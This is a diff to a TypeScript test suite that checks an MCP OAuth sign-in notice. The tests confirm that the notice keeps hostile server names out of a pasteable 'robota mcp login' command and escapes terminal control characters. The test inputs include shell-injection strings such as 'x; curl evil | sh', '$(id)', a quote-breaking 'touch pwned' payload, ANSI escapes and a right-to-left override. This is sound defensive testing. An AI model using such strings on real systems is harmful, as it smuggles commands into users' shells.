@@ -432,18 +432,36 @@ describe('MCP OAuth notices and browser', () => {
     ).toContain('"files:write"');
   });
 
-  it('quotes a hostile server name in the sign-in command, or leaves it out', () => {
+  it('puts a server name into the sign-in command only when it is safe to paste', () => {
     const notice = (serverId: string): string =>
       formatMcpOAuthNotice({ kind: 'login-required', serverId });
-    expect(notice('x; curl evil | sh')).toContain("run robota mcp login 'x; curl evil | sh'");
-    expect(notice('x$(id)')).toContain("run robota mcp login 'x$(id)'");
-    expect(notice('x`id`')).toContain("run robota mcp login 'x`id`'");
-    for (const name of ['x\nrun robota mcp login good', 'x\u001b[2Kgood', 'x\u202egood']) {
+    for (const name of [
+      'x; curl evil | sh',
+      'x$(id)',
+      'x`id`',
+      "\\';touch pwned;#",
+      '-rf',
+      '=cmd',
+      'x\nrun robota mcp login good',
+      'x\u001b[2Kgood',
+      'x‮good',
+    ]) {
       expect(notice(name)).toContain('run robota mcp login <server>');
-      for (const hidden of ['\n', '\u001b', '\u202e', 'good']) {
-        expect(notice(name)).not.toContain(hidden);
+      for (const shown of [name, '\n', '\u001b', '‮', 'good', 'pwned']) {
+        expect(notice(name)).not.toContain(shown);
       }
     }
+  });
+
+  it('escapes control and format characters in a server name it shows', () => {
+    const text = formatMcpOAuthNotice({
+      kind: 'insufficient-scope',
+      serverId: 'x\u001b[2K‮\ny',
+      scope: 'files:write',
+    });
+    expect(text).toBe(
+      'MCP server "x\\u001b[2K\\u202e\\ny" refused the request: it requires the scope "files:write".',
+    );
   });
 
   it('opens only https URLs, by argv, with each platform opener', async () => {
